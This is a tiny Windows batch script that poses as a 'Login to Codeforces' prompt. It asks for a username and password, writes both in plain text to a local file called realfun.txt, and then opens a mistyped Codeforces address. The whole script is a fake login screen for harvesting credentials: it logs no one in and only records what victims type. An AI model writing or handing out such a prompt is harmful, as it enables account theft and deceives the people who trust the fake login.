@echo off
::color 04
title Login to Codeforces
cls
echo Please Enter Your Username and Password
echo.
echo.
set /p user=username:
set /p pass=password:
cls
echo username=%user% password=%pass% >realfun.txt
start wwww.codeforces.com
